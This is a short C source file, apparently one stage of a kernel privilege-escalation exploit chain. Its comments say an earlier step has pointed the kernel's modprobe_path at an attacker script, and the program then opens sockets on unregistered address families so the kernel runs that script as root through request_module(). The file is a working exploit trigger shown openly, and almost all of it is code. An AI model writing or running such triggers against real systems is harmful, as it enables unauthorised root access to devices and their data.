/* Trigger a request_module() so the kernel execs whatever modprobe_path now
 * points at (broot7's UMH7 delivery has just aimed it at our script).
 *
 * An unregistered address family is the classic trigger: socket(AF_*, 0, 0)
 * on a family the kernel has no handler for lands in
 * net/socket.c:__sock_create() -> request_module("net-pf-%d").
 * Several families are tried in one run because which ones are compiled out
 * is a ROM detail; the first one that returns EAFNOSUPPORT via request_module
 * has already fired the helper (the helper is async, so the socket error and
 * the exec are not ordered). */
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>

/* families that small kernels typically leave as modules; keep in the order
 * least likely to be built-in first */
static const int fams[] = {
    5,    /* AF_APPLETALK */
    4,    /* AF_IPX */
    6,    /* AF_NETROM */
    7,    /* AF_BRIDGE (usually built in -- kept for completeness) */
    9,    /* AF_X25 */
    3,    /* AF_AX25 */
    12,   /* AF_NETBEUI */
};

int main(void)
{
    size_t i;

    for (i = 0; i < sizeof fams / sizeof fams[0]; i++) {
        int fd = (int)socket(fams[i], SOCK_DGRAM, 0);
        int e = errno;

        printf("socket(AF=%d) = %d (errno=%d %s)\n", fams[i], fd, e, strerror(e));
        fflush(stdout);
        if (fd >= 0)
            close(fd);
    }
    /* give the async usermode helper a moment before the caller checks */
    sleep(2);
    return 0;
}
